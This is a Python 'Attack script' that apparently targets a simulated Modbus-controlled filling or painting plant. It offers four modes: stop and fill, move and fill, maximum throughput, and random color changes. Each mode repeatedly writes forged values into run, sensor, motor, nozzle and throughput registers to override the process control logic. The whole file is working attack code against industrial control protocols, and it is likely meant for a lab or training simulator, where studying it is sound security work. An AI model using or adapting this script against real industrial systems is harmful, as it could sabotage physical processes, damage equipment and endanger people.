#!/usr/bin/env python3
import time
import argparse
import textwrap
import random
from modbus import COLORS

from modbus import (
    REG_RUN,
    REG_LEVEL,
    REG_CONTACT,
    REG_MOTOR,
    REG_NOZZLE,
    REG_THROUGHPUT,
    REG_COLOR,
    MODBUS_PORT,
)
from modbus import ClientModbus as Client
from modbus import ConnectionException

parser = argparse.ArgumentParser(
        formatter_class=argparse.RawDescriptionHelpFormatter,
        description=textwrap.dedent('''\
        Attack script
        Types :
            - 1 : Stop and fill (default)
            - 2 : Move and fill
            - 3 : Max throughput
            - 4 : Color
        '''))
parser.add_argument("-i", "--ip", required=False, help="IP", default="127.0.0.1")
parser.add_argument("-p", "--port", type=int, required=False, help="Port", default=MODBUS_PORT)
parser.add_argument("-a", "--attack", type=int, required=False, help="Attack type", default=1)
parser.add_argument("-f", "--frequency", type=int, required=False, help="Modbus frame frequency (sequence/s)", default=100)
args = parser.parse_args()

client = Client(args.ip, args.port)
period = 1/args.frequency

if ( args.attack == 1 ):
    motor = 0
    nozzle = 1
    level = 0
    contact = 0
elif ( args.attack == 2):
    motor = 1
    nozzle = 1
    level = 0
    contact = 0

try:
    client.connect()

    while True:
        client.write(REG_RUN, 1) 	    # Run Plant, Run!
        if ( args.attack == 3 ):
            client.write(REG_THROUGHPUT, 20)
        elif ( args.attack == 4):
            nozzle = client.read(REG_NOZZLE)
            if ( nozzle ):
                client.write(REG_COLOR, random.randrange(0, len(COLORS), 1))
                client.write(REG_NOZZLE, 0)
                time.sleep(period)
                client.write(REG_NOZZLE, 1)
        else:
            client.write(REG_LEVEL, level) 	    # Level Sensor
            client.write(REG_MOTOR, motor) 	    # Level Sensor
            client.write(REG_NOZZLE, nozzle) 	    # Level Sensor
            client.write(REG_CONTACT, contact) 	# Contact Sensor
        time.sleep(period)

except KeyboardInterrupt:
    client.close()
except ConnectionException:
    client.close()
    print ("Unable to connect / Connection lost")
